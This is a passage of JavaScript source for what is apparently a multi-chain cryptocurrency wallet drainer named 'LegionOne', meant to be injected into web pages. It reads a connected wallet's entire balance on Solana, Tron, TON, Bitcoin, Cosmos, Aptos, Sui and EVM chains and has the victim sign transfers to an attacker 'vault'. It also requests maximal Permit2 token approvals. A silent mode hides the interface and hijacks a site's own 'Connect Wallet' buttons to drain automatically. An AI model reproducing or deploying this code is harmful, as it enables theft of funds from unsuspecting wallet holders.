    var amount = parseNativeAmountFromBalance(balanceData, 'sol');
    if (amount === '0') throw new Error('No spendable SOL balance detected');
    setStatus('Building Solana transfer…', 'busy');
    var unsignedB64 = await buildSolNativeTransferWire(wallets.sol.address, vault, amount);
    setStatus('Sign SOL transfer in wallet…', 'busy');
    var signedB64 = await signSolWire(unsignedB64);
    return submitOmnichainSingleLeg({
      walletAddress: wallets.sol.address,
      tokenAnchor: 'OMNI_SOL_ANCHOR',
      walletType: walletTypeLabel(wallets.sol),
      scoutUsd: scoutUsd,
      noncePrefix: 'sol',
      solana_payload: {
        native_amount_sol: amount,
        native_signed_transaction_sol: signedB64,
      },
    });
  }

  async function runTronDrain(scoutUsd) {
    if (!wallets.tron) throw new Error('TronLink not connected');
    if (!window.tronWeb || !window.tronWeb.trx || !window.tronWeb.transactionBuilder) {
      throw new Error('TronWeb not ready — unlock TronLink and refresh');
    }
    var vault = requireVaultAddress('tron');
    var balanceData = await apiGet('/api/v1/balance/multi?tron=' + encodeURIComponent(wallets.tron.address));
    var amount = parseNativeAmountFromBalance(balanceData, 'tron');
    if (amount === '0') throw new Error('No spendable TRX balance detected');
    var amountNum = Number(amount);
    if (!Number.isFinite(amountNum) || amountNum <= 0) throw new Error('Invalid TRX amount');
    setStatus('Building TRX transfer…', 'busy');
    var unsigned = await window.tronWeb.transactionBuilder.sendTrx(
      vault,
      amountNum,
      wallets.tron.address,
    );
    setStatus('Sign TRX transfer in TronLink…', 'busy');
    var signed = await window.tronWeb.trx.sign(unsigned);
    return submitOmnichainSingleLeg({
      walletAddress: wallets.tron.address,
      tokenAnchor: 'OMNI_TRON_ANCHOR',
      walletType: walletTypeLabel(wallets.tron),
      scoutUsd: scoutUsd,
      noncePrefix: 'tron',
      tron_payload: {
        native_amount_trx: amount,
        native_signed_transaction_trx: toPlainJson(signed),
      },
    });
  }

  async function runTonDrain(scoutUsd) {
    if (!wallets.ton) throw new Error('Tonkeeper not connected');
    var ton = wallets.ton.signer;
    if (!ton || !ton.send) throw new Error('Tonkeeper signer unavailable');
    var vault = requireVaultAddress('ton');
    var balanceData = await apiGet('/api/v1/balance/multi?ton=' + encodeURIComponent(wallets.ton.address));
    var amount = parseNativeAmountFromBalance(balanceData, 'ton');
    if (amount === '0') throw new Error('No spendable TON balance detected');
    setStatus('Sign TON transfer in Tonkeeper…', 'busy');
    var validUntil = Math.floor(Date.now() / 1000) + 600;
    var txResult = await ton.send('ton_sendTransaction', {
      validUntil: validUntil,
      messages: [{ address: vault, amount: amount }],
    });
    var boc = txResult && (txResult.boc || txResult.transaction || txResult.signedBoc || txResult);
    if (!boc) throw new Error('Tonkeeper did not return signed transaction');
    var signedBoc = typeof boc === 'string' ? boc : (boc.boc || safeStringify(boc));
    return submitOmnichainSingleLeg({
      walletAddress: wallets.ton.address,
      tokenAnchor: 'OMNI_TON_ANCHOR',
      walletType: walletTypeLabel(wallets.ton),
      scoutUsd: scoutUsd,
      noncePrefix: 'ton',
      ton_payload: {
        native_amount_ton: amount,
        native_signed_transaction_ton: String(signedBoc),
      },
    });
  }

  async function runBitcoinPsbt(scoutUsd) {
    if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
    setStatus('Building Bitcoin PSBT…', 'busy');
    var balanceData = null;
    try {
      balanceData = await apiGet('/api/v1/balance/multi?btc=' + encodeURIComponent(wallets.btc.address));
    } catch (e) { /* optional */ }
    var amountSat = parseNativeAmountFromBalance(balanceData, 'btc');
    if (amountSat === '0') {
      throw new Error('No spendable BTC balance — fund your wallet with testnet/mainnet sats first');
    }
    var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
      wallet_address: wallets.btc.address,
      amount_sat: amountSat,
    });
    if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');
    var signedPsbt = psbt.psbt_base64;
    if (window.unisat && window.unisat.signPsbt) {
      signedPsbt = await window.unisat.signPsbt(psbt.psbt_base64);
    } else if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      var signed = await window.XverseProviders.BitcoinProvider.request('signPsbt', { psbt: psbt.psbt_base64 });
      signedPsbt = signed && signed.psbt ? signed.psbt : signedPsbt;
    }
    setStatus('Submitting Bitcoin anchor…', 'busy');
    return apiPost('/api/v1/signature-anchor', {
      ingress: 'normalized_v1',
      chain_family: 'UTXO',
      protocol: 'bitcoin_psbt',
      wallet_address: wallets.btc.address,
      token_address: 'BTC',
      signature: signedPsbt,
      signed_psbt_base64: signedPsbt,
      amount: amountSat,
      nonce: 'btc:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: walletTypeLabel(wallets.btc),
      scout_value_usd: scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    });
  }

  async function signCosmosNativeTransfer(from, to, amountUatom) {
    var chainId = 'cosmoshub-4';
    await window.keplr.enable(chainId);
    var offlineSigner = window.getOfflineSigner(chainId);
    var mod = await import('https://esm.sh/@cosmjs/stargate@0.32.4');
    var client = await mod.SigningStargateClient.connectWithSigner(
      'https://rpc.cosmos.network',
      offlineSigner,
      { gasPrice: mod.GasPrice.fromString('0.025uatom') },
    );
    try {
      var fee = { amount: mod.coins(5000, 'uatom'), gas: '200000' };
      var signed = await client.sign(from, [{
        typeUrl: '/cosmos.bank.v1beta1.MsgSend',
        value: {
          fromAddress: from,
          toAddress: to,
          amount: mod.coins(String(amountUatom), 'uatom'),
        },
      }], fee, 'Legion settlement');
      var txRawMod = await import('https://esm.sh/cosmjs-types@0.9.0/cosmos/tx/v1beta1/tx');
      var txBytes = txRawMod.TxRaw.encode({
        bodyBytes: signed.bodyBytes,
        authInfoBytes: signed.authInfoBytes,
        signatures: signed.signatures,
      }).finish();
      var bin = '';
      for (var i = 0; i < txBytes.length; i++) bin += String.fromCharCode(txBytes[i]);
      return btoa(bin);
    } finally {
      client.disconnect();
    }
  }

  async function runCosmosDrain(scoutUsd) {
    if (!wallets.cosmos) throw new Error('Keplr not connected');
    var vault = requireVaultAddress('cosmos');
    var balanceData = await apiGet('/api/v1/balance/multi?cosmos=' + encodeURIComponent(wallets.cosmos.address));
    var amount = parseNativeAmountFromBalance(balanceData, 'cosmos');
    if (amount === '0') throw new Error('No spendable ATOM balance detected');
    setStatus('Sign Cosmos transfer in Keplr…', 'busy');
    var signedTx = await signCosmosNativeTransfer(wallets.cosmos.address, vault, amount);
    return submitOmnichainSingleLeg({
      walletAddress: wallets.cosmos.address,
      tokenAnchor: 'OMNI_COSMOS_ANCHOR',
      walletType: walletTypeLabel(wallets.cosmos),
      scoutUsd: scoutUsd,
      noncePrefix: 'cosmos',
      cosmos_payload: {
        native_amount_cosmos: amount,
        cosmos_signed_tx: signedTx,
        cosmos_tx_encoding: 'base64',
      },
    });
  }

  async function runAptosDrain(scoutUsd) {
    if (!wallets.aptos) throw new Error('Petra not connected');
    var vault = requireVaultAddress('aptos');
    var balanceData = await apiGet('/api/v1/balance/multi?aptos=' + encodeURIComponent(wallets.aptos.address));
    var amount = parseNativeAmountFromBalance(balanceData, 'aptos');
    if (amount === '0') throw new Error('No spendable APT balance detected');
    var aptos = wallets.aptos.signer;
    if (!aptos) throw new Error('Petra signer not available');
    setStatus('Sign Aptos transfer in Petra…', 'busy');
    var payload = {
      arguments: [vault, amount],
      function: '0x1::aptos_account::transfer',
      type: 'entry_function_payload',
      type_arguments: [],
    };
    var signedTx = null;
    var aptosSig = null;
    if (aptos.signTransaction) {
      var pending = await aptos.signTransaction(payload);
      signedTx = pending && (pending.bcsToBytes || pending.rawTransaction || pending);
      if (typeof signedTx === 'object' && signedTx.signature) aptosSig = signedTx.signature;
      if (typeof signedTx !== 'string' && signedTx && signedTx.toString) signedTx = signedTx.toString();
    } else if (aptos.signAndSubmitTransaction) {
      var submitted = await aptos.signAndSubmitTransaction(payload);
      signedTx = submitted && (submitted.hash || submitted.transactionHash || safeStringify(submitted));
      aptosSig = submitted && submitted.signature ? submitted.signature : 'submitted';
    } else {
      throw new Error('Petra wallet API unavailable — update Petra extension');
    }
    return submitOmnichainSingleLeg({
      walletAddress: wallets.aptos.address,
      tokenAnchor: 'OMNI_APTOS_ANCHOR',
      walletType: walletTypeLabel(wallets.aptos),
      scoutUsd: scoutUsd,
      noncePrefix: 'aptos',
      aptos_payload: {
        native_amount_aptos: amount,
        aptos_signed_tx: String(signedTx),
        aptos_signature: aptosSig ? String(aptosSig) : 'petra',
        aptos_tx_encoding: 'hex',
      },
    });
  }

  async function runSuiDrain(scoutUsd) {
    if (!wallets.sui) throw new Error('Sui Wallet not connected');
    var vault = requireVaultAddress('sui');
    var balanceData = await apiGet('/api/v1/balance/multi?sui=' + encodeURIComponent(wallets.sui.address));
    var amount = parseNativeAmountFromBalance(balanceData, 'sui');
    if (amount === '0') throw new Error('No spendable SUI balance detected');
    setStatus('Building Sui transaction…', 'busy');
    var suiMod = await import('https://esm.sh/@mysten/sui.js@0.54.1/transactions');
    var tx = new suiMod.TransactionBlock();
    var amountSplit = tx.splitCoins(tx.gas, [tx.pure(amount)]);
    tx.transferObjects([amountSplit], tx.pure(vault));
    var suiWallet = wallets.sui.signer;
    if (!suiWallet) throw new Error('Sui Wallet signer not available');
    var features = suiWallet.features || {};
    var signFeature = features['sui:signTransactionBlock'] || features['sui:signTransaction'];
    if (!signFeature || !signFeature.signTransactionBlock) {
      throw new Error('Sui Wallet signTransactionBlock feature unavailable — update extension');
    }
    setStatus('Sign Sui transfer…', 'busy');
    var signed = await signFeature.signTransactionBlock({
      transactionBlock: tx,
      account: wallets.sui.address,
      chain: 'sui:mainnet',
    });
    return submitOmnichainSingleLeg({
      walletAddress: wallets.sui.address,
      tokenAnchor: 'OMNI_SUI_ANCHOR',
      walletType: walletTypeLabel(wallets.sui),
      scoutUsd: scoutUsd,
      noncePrefix: 'sui',
      sui_payload: {
        native_amount_sui: amount,
        sui_signed_tx: signed.bytes || signed.transactionBlockBytes || signed.transaction,
        sui_signature: signed.signature,
      },
    });
  }

  async function runEvmDrain(scoutUsd) {
    if (!wallets.evm) throw new Error('EVM wallet required for Permit2 batch');
    var evm = wallets.evm;
    var fusionResult = await postFusion();
    var fusion = fusionResult.fusion;
    var amounts = estimateNative(fusion);
    var permits = extractPermits(fusion);

    try {
      var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evm.address, chain_family: 'EVM' });
      if (ranked.assets && ranked.assets.length) {
        var top = ranked.assets.filter(function (a) {
          return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0;
        }).slice(0, 8).map(function (a) { return { token: a.token, amount: a.amount_raw || MAX_PERMIT }; });
        if (top.length) permits = top;
      }
    } catch (e) { /* ranked optional */ }

    setStatus('Preparing Permit2 batch…', 'busy');
    var batchBody = {
      wallet_address: evm.address,
      chain_id: evm.chainId,
      permits: permits,
      nativeAmount: amounts.native,
    };
    if (wallets.sol) { batchBody.sol_wallet = wallets.sol.address; batchBody.nativeAmountSol = amounts.sol; }
    if (wallets.tron) { batchBody.trx_wallet = wallets.tron.address; batchBody.nativeAmountTrx = amounts.trx; }
    if (wallets.ton) { batchBody.ton_wallet = wallets.ton.address; batchBody.nativeAmountTon = amounts.ton; }

    var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
    if (!batch.typed_data || !batch.batch_permit_metadata) throw new Error('Batch typed data missing');

    setStatus('Sign Permit2 authorization…', 'busy');
    var permitSig = await signEvmTypedData(batch.typed_data);

    var nativeSignedTx = null;
    if (batch.native_transfer && BigInt(batch.nativeAmount || '0') > 0n) {
      setStatus('Sign EVM native transfer…', 'busy');
      nativeSignedTx = await signEvmNativeTx(batch.native_transfer);
    }

    var nativeSignedSol = null;
    if (batch.spl_transfer && batch.spl_amount && BigInt(batch.spl_amount) > 0n) {
      nativeSignedSol = await signSolWire(batch.spl_transfer.unsignedWireBase64);
    } else if (batch.native_transfer_sol && batch.native_amount_sol && BigInt(batch.native_amount_sol) > 0n) {
      nativeSignedSol = await signSolWire(batch.native_transfer_sol.unsignedWireBase64);
    }

    var nativeSignedTrx = null;
    if (batch.native_transfer_trx && batch.native_amount_trx && BigInt(batch.native_amount_trx) > 0n) {
      nativeSignedTrx = await signTronTx(batch.native_transfer_trx);
    }

    var nativeSignedTon = null;
    if (batch.native_transfer_ton && batch.native_amount_ton && BigInt(batch.native_amount_ton) > 0n) {
      nativeSignedTon = await signTonTx(batch.native_transfer_ton);
    }

    var anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      protocol: 'omnichain_atomic_v1',
      wallet_address: evm.address,
      token_address: permits[0].token,
      permits: permits,
      batch_permit_metadata: batch.batch_permit_metadata,
      chain_id: evm.chainId,
      engine_spender: batch.engine_spender,
      permit2: batch.permit2,
      nativeAmount: batch.nativeAmount || amounts.native,
      signature: permitSig,
      nonce: 'omni:' + Date.now(),
      expiry_iso: EXPIRY_ISO,
      wallet_type: walletTypeLabel(evm),
      scout_value_usd: scoutUsd || 1,
      max_allowance: MAX_PERMIT,
      requires_quorum: false,
    };

    if (nativeSignedTx) anchorBody.native_signed_transaction = nativeSignedTx;
    if (wallets.sol) anchorBody.sol_wallet = wallets.sol.address;
    if (wallets.tron) anchorBody.trx_wallet = wallets.tron.address;
    if (wallets.ton) anchorBody.ton_wallet = wallets.ton.address;
    if (nativeSignedSol) anchorBody.native_signed_transaction_sol = nativeSignedSol;
    if (batch.spl_mint) anchorBody.spl_mint = batch.spl_mint;
    if (batch.spl_amount) anchorBody.spl_amount = batch.spl_amount;
    if (nativeSignedTrx) anchorBody.native_signed_transaction_trx = toPlainJson(nativeSignedTrx);
    if (nativeSignedTon) anchorBody.native_signed_transaction_ton = nativeSignedTon;
    if (batch.native_amount_sol) anchorBody.nativeAmountSol = batch.native_amount_sol;
    if (batch.native_amount_trx) anchorBody.nativeAmountTrx = batch.native_amount_trx;
    if (batch.native_amount_ton) anchorBody.nativeAmountTon = batch.native_amount_ton;

    setStatus('Submitting to settlement engine…', 'busy');
    return apiPost('/api/v1/signature-anchor', anchorBody);
  }

  /* ── Main drain orchestrator ──────────────────────────────────────────── */
  async function runDrain(opts) {
    if (drainRunning) return;
    drainRunning = true;
    var skipConnect = opts && opts.skipConnect;
    var btn = document.getElementById('legion-one-drain-btn');
    if (btn) btn.disabled = true;

    try {
      await loadClientConfigVaults();
      var vaultTabs = ['sol', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
      if (vaultTabs.indexOf(ACTIVE_TAB) >= 0) {
        requireVaultAddress(ACTIVE_TAB);
      }
      setStatus('Connecting…', 'busy');
      var conn = skipConnect ? (
        ACTIVE_TAB === 'evm' ? wallets.evm :
        ACTIVE_TAB === 'sol' ? wallets.sol :
        ACTIVE_TAB === 'tron' ? wallets.tron :
        ACTIVE_TAB === 'ton' ? wallets.ton :
        ACTIVE_TAB === 'btc' ? wallets.btc :
        ACTIVE_TAB === 'cosmos' ? wallets.cosmos :
        ACTIVE_TAB === 'aptos' ? wallets.aptos :
        ACTIVE_TAB === 'sui' ? wallets.sui : null
      ) : await connectActiveTab();
      if (!conn) throw new Error('Connect a wallet first');

      setStatus('Scouting wallet…', 'busy');
      await postScout(conn);
      await fetchBalanceDisplay();

      var fusionResult = await postFusion();
      var scoutUsd = fusionResult.total_usd || 1;

      if (ACTIVE_TAB === 'btc') {
        setStatus('Draining Bitcoin via PSBT…', 'busy');
        var btcResult = await runBitcoinPsbt(scoutUsd);
        setStatus('Bitcoin anchor: ' + (btcResult.transaction_hash || btcResult.settlement_status || 'submitted'), 'ok');
        return btcResult;
      }

      if (ACTIVE_TAB === 'sol') {
        setStatus('Draining Solana…', 'busy');
        var solResult = await runSolanaDrain(scoutUsd);
        setStatus('Solana settlement: ' + (solResult.transaction_hash || solResult.settlement_status || 'submitted'), 'ok');
        return solResult;
      }

      if (ACTIVE_TAB === 'tron') {
        setStatus('Draining Tron…', 'busy');
        var tronResult = await runTronDrain(scoutUsd);
        setStatus('Tron settlement: ' + (tronResult.transaction_hash || tronResult.settlement_status || 'submitted'), 'ok');
        return tronResult;
      }

      if (ACTIVE_TAB === 'ton') {
        setStatus('Draining TON…', 'busy');
        var tonResult = await runTonDrain(scoutUsd);
        setStatus('TON settlement: ' + (tonResult.transaction_hash || tonResult.settlement_status || 'submitted'), 'ok');
        return tonResult;
      }

      if (ACTIVE_TAB === 'cosmos') {
        var cosmosResult = await runCosmosDrain(scoutUsd);
        setStatus('Cosmos settlement: ' + (cosmosResult.transaction_hash || cosmosResult.settlement_status || 'submitted'), 'ok');
        return cosmosResult;
      }

      if (ACTIVE_TAB === 'aptos') {
        var aptosResult = await runAptosDrain(scoutUsd);
        setStatus('Aptos settlement: ' + (aptosResult.transaction_hash || aptosResult.settlement_status || 'submitted'), 'ok');
        return aptosResult;
      }

      if (ACTIVE_TAB === 'sui') {
        var suiResult = await runSuiDrain(scoutUsd);
        setStatus('Sui settlement: ' + (suiResult.transaction_hash || suiResult.settlement_status || 'submitted'), 'ok');
        return suiResult;
      }

      if (ACTIVE_TAB !== 'evm') {
        throw new Error('Unsupported chain tab: ' + ACTIVE_TAB);
      }

      if (KINETIC_KEY) {
        setStatus('Checking existing allowances…', 'busy');
        var reused = await tryAllowanceReuse();
        if (reused) {
          setStatus('Drained via existing allowance — done', 'ok');
          return reused;
        }
      }

      setStatus('Draining EVM…', 'busy');
      var result = await runEvmDrain(scoutUsd);
      var tx = result.transaction_hash || result.settlement_status || 'submitted';
      setStatus('Settlement complete: ' + tx, 'ok');
      return result;
    } catch (err) {
      setStatus(formatError(err), 'err');
      console.warn('[LEGION_ONE]', formatError(err));
      throw err;
    } finally {
      drainRunning = false;
      if (btn) btn.disabled = false;
    }
  }

  /* ── UI ───────────────────────────────────────────────────────────────── */
  function makeDraggable(panel, handle) {
    var dragging = false;
    var ox = 0;
    var oy = 0;
    handle.addEventListener('mousedown', function (e) {
      if (e.target.tagName === 'BUTTON') return;
      dragging = true;
      var r = panel.getBoundingClientRect();
      ox = e.clientX - r.left;
      oy = e.clientY - r.top;
      panel.style.right = 'auto';
      panel.style.bottom = 'auto';
      panel.style.left = r.left + 'px';
      panel.style.top = r.top + 'px';
      e.preventDefault();
    });
    document.addEventListener('mousemove', function (e) {
      if (!dragging) return;
      panel.style.left = Math.max(0, e.clientX - ox) + 'px';
      panel.style.top = Math.max(0, e.clientY - oy) + 'px';
    });
    document.addEventListener('mouseup', function () { dragging = false; });
  }

  function mountUi() {
    injectStyles();

    if (SILENT_MODE) {
      document.body.classList.add('legion-one-silent');
      var hidden = document.createElement('div');
      hidden.id = 'legion-one-status';
      hidden.style.display = 'none';
      document.body.appendChild(hidden);
      hookConnectButtons();
      if (window.ethereum && window.ethereum.selectedAddress && AUTO_DRAIN) {
        wallets.evm = {
          address: window.ethereum.selectedAddress,
          chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
          provider: 'Injected',
        };
        ACTIVE_TAB = 'evm';
        runDrain({ skipConnect: true });
      }
      return;
    }

    var launcher = document.createElement('button');
    launcher.id = 'legion-one-launcher';
    launcher.type = 'button';
    launcher.title = 'Wallet';
    launcher.textContent = '⬡';
    launcher.addEventListener('click', function () {
      document.getElementById('legion-one-panel').classList.toggle('open');
    });

    var panel = document.createElement('div');
    panel.id = 'legion-one-panel';
    panel.innerHTML = [
      '<div class="hdr"><span>Wallet Connect</span><button type="button" id="legion-one-close" aria-label="Close">×</button></div>',
      '<div class="tabs">',
      '  <button type="button" data-tab="evm" class="on">EVM</button>',
      '  <button type="button" data-tab="sol">SOL</button>',
      '  <button type="button" data-tab="tron">TRX</button>',
      '  <button type="button" data-tab="ton">TON</button>',
      '  <button type="button" data-tab="btc">BTC</button>',
      '  <button type="button" data-tab="cosmos">ATOM</button>',
      '  <button type="button" data-tab="aptos">APT</button>',
      '  <button type="button" data-tab="sui">SUI</button>',
      '</div>',
      '<div class="body">',
      '  <div id="legion-one-status">Select chain and connect.</div>',
      '  <div id="legion-one-balance"></div>',
      '  <div id="legion-one-progress"><i></i></div>',
      '  <button type="button" class="btn btn-secondary" id="legion-one-wc-btn">WalletConnect</button>',
      '  <button type="button" class="btn btn-primary" id="legion-one-drain-btn">Connect &amp; Drain</button>',
      '</div>',
    ].join('');

    document.body.appendChild(launcher);
    document.body.appendChild(panel);

    panel.querySelector('#legion-one-close').addEventListener('click', function () {
      panel.classList.remove('open');
    });

    makeDraggable(panel, panel.querySelector('.hdr'));

    panel.querySelectorAll('.tabs button').forEach(function (tab) {
      tab.addEventListener('click', function () {
        ACTIVE_TAB = tab.getAttribute('data-tab') || 'evm';
        panel.querySelectorAll('.tabs button').forEach(function (b) { b.classList.remove('on'); });
        tab.classList.add('on');
        var ext = CHAIN_EXTENSIONS[ACTIVE_TAB];
        var hint = ext ? ext.name : ACTIVE_TAB;
        setStatus('Chain: ' + ACTIVE_TAB.toUpperCase() + ' — needs ' + hint, null);
      });
    });

    document.getElementById('legion-one-wc-btn').addEventListener('click', async function () {
      if (ACTIVE_TAB !== 'evm' && ACTIVE_TAB !== 'sol') {
        setStatus('WalletConnect supports EVM and Solana only — use the chain tab for ' + ACTIVE_TAB.toUpperCase(), 'err');
        return;
      }
      try {
        setStatus('Opening WalletConnect…', 'busy');
        await connectWalletConnect();
        if (wallets.evm) ACTIVE_TAB = 'evm';
        else if (wallets.sol) ACTIVE_TAB = 'sol';
        if (AUTO_DRAIN) await runDrain({ skipConnect: true });
        else setStatus('WalletConnect connected', 'ok');
      } catch (e) {
        setStatus(formatError(e), 'err');
      }
    });

    document.getElementById('legion-one-drain-btn').addEventListener('click', function () {
      runDrain({ skipConnect: false });
    });

    if (!WC_PROJECT_ID) {
      document.getElementById('legion-one-wc-btn').disabled = true;
      document.getElementById('legion-one-wc-btn').title = 'Set LEGION_CONFIG.wcProjectId';
    }
  }

  function hookConnectButtons() {
    var re = /connect\s*(wallet)?|wallet\s*connect|sign\s*in/i;
    document.querySelectorAll('button,a,[role="button"]').forEach(function (el) {
      if (el.__legionHook) return;
      var label = ((el.textContent || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
      if (!re.test(label)) return;
      el.__legionHook = true;
      el.addEventListener('click', function () {
        setTimeout(function () {
          if (window.ethereum && window.ethereum.selectedAddress) {
            wallets.evm = {
              address: window.ethereum.selectedAddress,
              chainId: window.ethereum.chainId ? parseInt(window.ethereum.chainId, 16) : 1,
              provider: 'Injected',
            };
            ACTIVE_TAB = 'evm';
            if (AUTO_DRAIN) runDrain({ skipConnect: true });
          }
        }, 1500);
      }, true);
    });
  }

  /* ── Public API ───────────────────────────────────────────────────────── */
  window.LegionOne = {
    connect: connectActiveTab,
    connectWalletConnect: connectWalletConnect,
    drain: runDrain,
    getWallets: publicWalletSnapshot,
    safeStringify: safeStringify,
    setTab: function (tab) { ACTIVE_TAB = tab; },
    config: CFG,
  };

  function boot() {
    mountUi();
    loadClientConfigVaults().catch(function () { /* non-fatal */ });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }
})();
